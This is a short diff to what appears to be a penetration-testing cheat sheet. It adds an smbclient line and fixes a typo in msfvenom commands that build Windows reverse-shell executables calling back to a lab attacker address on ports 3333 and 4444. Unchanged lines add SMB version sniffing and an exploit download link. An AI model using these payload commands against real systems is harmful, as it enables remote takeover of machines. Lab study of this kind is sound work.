@@ -114,6 +114,7 @@ Pattern
                        ngrep -i -d tun0
                        ngrep -i -d tun0 's.?a.?m.?b.?a.*[[:digit:]]' 
                        wireshark --> search for Session Setup ANDX Response
+                smbclient -U <ip>/<folder>
                 smbclient //<ip>/tmp
                 smbclient \\\<ip>\\ipc$ -U pkong
                 smbclient //<ip>/ipc$ -U pkong
@@ -424,8 +425,8 @@ Pattern
       
              Download: https://github.com/turbo/zero2hero  --> main.c
              Create two reverse shells
-                     msfvenom -a x86 --platform Windows -p windows/shell_everse_tcp LHOST=192.168.119.131 LPORT=3333 -f exe -o reverse_3333.exe
-                     msfvenom -a x86 --platform Windows -p windows/shell_everse_tcp LHOST=192.168.119.131 LPORT=4444 -f exe -o reverse_4444.exe
+                     msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.119.131 LPORT=3333 -f exe -o reverse_3333.exe
+                     msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.119.131 LPORT=4444 -f exe -o reverse_4444.exe
 
                      msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=192.168.119.131 LPORT=3333 -f exe -o reverse_3333.exe
                      msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=192.168.119.131 LPORT=4444 -f exe -o reverse_4444.exe
